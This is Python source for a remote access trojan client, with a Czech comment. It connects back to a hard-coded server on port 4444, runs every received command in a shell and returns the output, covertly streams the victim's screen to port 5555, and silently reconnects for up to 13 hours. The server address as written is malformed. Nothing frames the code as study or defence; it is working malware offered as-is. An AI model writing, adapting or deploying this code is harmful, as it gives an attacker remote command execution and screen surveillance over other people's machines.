import socket
import platform
import subprocess
import time
import threading
import mss
import numpy as np
import cv2

SERVER_IP = '10.0.1..12'  # změň na IP serveru
CMD_PORT = 4444
STREAM_PORT = 5555
RECONNECT_INTERVAL = 5
TIMEOUT = 60 * 60 * 13

def get_os_info():
    return platform.platform()

def execute_command(cmd):
    if cmd == 'screenstream':
        threading.Thread(target=start_screen_stream).start()
        return '[*] Starting screen stream...'
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode(errors='ignore')
    except Exception as e:
        return str(e)

def start_screen_stream():
    try:
        stream_socket = socket.socket()
        stream_socket.connect((SERVER_IP, STREAM_PORT))
        with mss.mss() as sct:
            while True:
                img = np.array(sct.grab(sct.monitors[0]))
                _, jpeg = cv2.imencode('.jpg', img, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
                data = jpeg.tobytes()
                size = len(data).to_bytes(4, byteorder='big')
                stream_socket.sendall(size + data)
                time.sleep(0.5)
    except:
        pass

def connect():
    start_time = time.time()
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, CMD_PORT))
            s.send(get_os_info().encode())
            while True:
                cmd = s.recv(1024).decode()
                if not cmd:
                    break
                result = execute_command(cmd)
                s.send(result.encode())
        except:
            if time.time() - start_time > TIMEOUT:
                break
            time.sleep(RECONNECT_INTERVAL)

if __name__ == '__main__':
    connect()
